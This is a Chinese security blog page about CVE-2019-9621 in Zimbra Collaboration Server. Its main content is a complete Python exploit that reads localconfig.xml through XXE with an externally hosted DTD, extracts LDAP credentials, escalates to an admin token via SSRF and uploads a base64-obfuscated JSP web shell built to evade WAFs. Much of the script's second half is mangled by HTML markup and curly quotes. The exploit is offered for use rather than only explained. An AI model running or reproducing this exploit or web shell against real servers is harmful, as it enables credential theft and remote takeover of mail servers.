@@ -1,0 +1,576 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Exp,Tool,GetShell,Zimbra">
+
+
+<meta name="description" content="
+
+
+
+发现时间
+
+
+2019年03月18日
+
+
+
+
+威胁目标
+
+
+采用Zimbra邮件系统的企业
+
+
+
+
+主要风险
+
+
+远程代码执行
+
+
+
+
+攻击入口
+
+
+localconfig.xml &amp;n...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="CVE-2019-9621 Zimbra<8.8.11 GetShell Exploit">
+            
+            CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Exp/">Exp</a> <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Exp/" rel="tag">Exp</a> <a class="tag-none-link" href="/tags/GetShell/" rel="tag">GetShell</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a> <a class="tag-none-link" href="/tags/Zimbra/" rel="tag">Zimbra</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/12/03</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1964</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
+<tbody style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<tr class="firstRow" style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border: 1px solid #000;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">发现时间</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: #000 #000 #000 currentcolor; border-style: solid solid solid none; border-width: 1px 1px 1px medium; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">2019<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">年<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">03<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">月<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">18<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">日</span></span></span></span></span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁目标</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">采用<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">邮件系统的企业</span></span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">主要风险</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">远程代码执行</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">攻击入口</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">localconfig.xml &nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">配置文件</span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">使用漏洞</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">CVE-2019-9621</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; height: 25px;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">受影响应用</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px 0px 5px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; border: none; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">ZimbraCollaboration Server 8.8.11&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">之前的版本都受到影响。</span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">已知影响</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">导致服务器信息泄露</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁程度</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">高</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<h3 style="margin: 0px; padding: 0px; font-weight: normal; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: arial, sans-serif; color: black;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: 宋体; color: black; letter-spacing: 0px;">漏洞描述：</span></span></h3>
+<p><span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体; font-size: 15px;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">当<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;Zimbra&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">存在像任意文件读取、<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">XXE<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">（<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">外部实体注入）<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">这种漏洞时，攻击者可以利用此漏洞读取<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;localconfig.xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">配置文件，获取到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;zimbra admin ldap password<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">，并通过<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;7071 admin&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">端口进行<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;SOAP AuthRequest&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">认证，得到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;admin authtoken</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>漏洞是利用XXE<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">和ProxyServlet SSRF&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">漏洞拿到&nbsp;admin authtoken&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">服务端打来Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">缓存服务是，<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">可以利用SSRF<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">攻击进行反序列化执行远程代码。不过由于Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">在单服务器安装中尽管Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">虽然启动但是并没有进行使用，所以其攻击场景受到限制。</span></span></span></span></span></span></span></span></span></span></p>
+<p><strong>影响版本：</strong></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:bash;gutter:true;"><span style="font-size: 15px;">ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：
+<ol>
+<li>
+<p>Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</p>
+</li>
+<li>
+<p>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。<br>
+</p></li></ol></span></pre><p></p>
+
+
+</div>
+<p><strong>&nbsp;GetShell代码</strong></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#coding=utf8
+import requests
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+base_url=sys.argv[1]
+base_url=base_url.rstrip("/")
+#upload file name and content
+#modify by k8gege
+#Connect "shell.jsp" using K8fly CmdShell
+#Because the CMD parameter is encrypted using Base64(bypass WAF)
+filename = "shell.jsp"
+fileContent = r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|&lt;-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;'
+print(base_url)
+#dtd file url
+dtd_url="https://k8gege.github.io/zimbra.dtd"
+"""
+&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;
+&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;
+"""
+xxe_data = r"""&lt;!DOCTYPE Autodiscover [
+        &lt;!ENTITY % dtd SYSTEM "{dtd}"&gt;
+        %dtd;
+        %all;
+        ]&gt;
+&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;
+    &lt;Request&gt;
+        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
+        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;
+    &lt;/Request&gt;
+&lt;/Autodiscover&gt;""".format(dtd=dtd_url)
+<p>#XXE stage<br>
+headers = {<br>
+“Content-Type”:“application/xml”<br>
+}<br>
+print(“[*] Get User Name/Password By XXE “)<br>
+r = requests.post(base_url+”/Autodiscover/Autodiscover.xml”,data=xxe_data,headers=headers,verify=False,timeout=15)<br>
+#print r.text<br>
+if ‘response schema not available’ not in r.text:<br>
+print(“have no xxe”)<br>
+exit()</p>
+<p>#low_token Stage<br>
+import re<br>
+pattern_name = re.compile(r"&lt;key name=("|“)zimbra_user("|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;“)<br>
+pattern_password = re.compile(r”&lt;key name=("|“)zimbra_ldap_password("|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;")<br>
+username = pattern_name.findall(r.text)[0][2]<br>
+password = pattern_password.findall(r.text)[0][2]<br>
+print(username)<br>
+print(password)</p>
+<p>auth_body=“”“&lt;soap:Envelope xmlns:soap=“<a target="_blank" rel="noopener" href="http://www.w3.org/2003/05/soap-envelope">http://www.w3.org/2003/05/soap-envelope</a>”&gt;<br>
+&lt;soap:Header&gt;<br>
+&lt;context xmlns=“urn:zimbra”&gt;<br>
+&lt;userAgent name=“ZimbraWebClient - SAF3 (Win)” version=“5.0.15_GA_2851.RHEL5_64”/&gt;<br>
+&lt;/context&gt;<br>
+&lt;/soap:Header&gt;<br>
+&lt;soap:Body&gt;<br>
+&lt;AuthRequest xmlns=”{xmlns}“&gt;<br>
+&lt;account by=“adminName”&gt;{username}&lt;/account&gt;<br>
+&lt;password&gt;{password}&lt;/password&gt;<br>
+&lt;/AuthRequest&gt;<br>
+&lt;/soap:Body&gt;<br>
+&lt;/soap:Envelope&gt;<br>
+“””<br>
+print(“[*] Get Low Privilege Auth Token”)<br>
+r=requests.post(base_url+“/service/soap”,data=auth_body.format(xmlns=“urn:zimbraAccount”,username=username,password=password),verify=False)</p>
+<p>pattern_auth_token=re.compile(r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;")</p>
+<p>low_priv_token = pattern_auth_token.findall(r.text)[0]</p>
+<p>#print(low_priv_token)</p>
+<h1>SSRF+Get Admin_Token Stage</h1>
+<p>headers[“Cookie”]=“ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+“;”<br>
+headers[“Host”]=“foo:7071”<br>
+print(“[*] Get Admin  Auth Token By SSRF”)<br>
+r = requests.post(base_url+“/service/proxy?target=<a target="_blank" rel="noopener" href="https://127.0.0.1:7071/service/admin/soap%22,data=auth_body.format(xmlns=%22urn:zimbraAdmin">https://127.0.0.1:7071/service/admin/soap",data=auth_body.format(xmlns="urn:zimbraAdmin</a>”,username=username,password=password),headers=headers,verify=False)</p>
+<p>admin_token =pattern_auth_token.findall(r.text)[0]<br>
+#print(“ADMIN_TOKEN:”+admin_token)</p>
+<p>f = {<br>
+‘filename1’:(None,“whocare”,None),<br>
+‘clientFile’:(filename,fileContent,“text/plain”),<br>
+‘requestId’:(None,“12”,None),<br>
+}</p>
+<p>headers ={<br>
+“Cookie”:“ZM_ADMIN_AUTH_TOKEN=”+admin_token+“;”<br>
+}<br>
+print(“[<em>] Uploading file")<br>
+r = requests.post(base_url+“/service/extension/clientUploader/upload”,files=f,headers=headers,verify=False)<br>
+#print(r.text)<br>
+print(“Shell: “+base_url+”/downloads/”+filename)<br>
+#print(“Connect "shell.jsp" using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)”)<br>
+print("[</em>] Request Result:”)<br>
+s = requests.session()<br>
+r = s.get(base_url+“/downloads/”+filename,verify=False,headers=headers)<br>
+#print(r.text)<br>
+print(“May need cookie:”)<br>
+print(headers[‘Cookie’])<br>
+</p></pre><p></p>
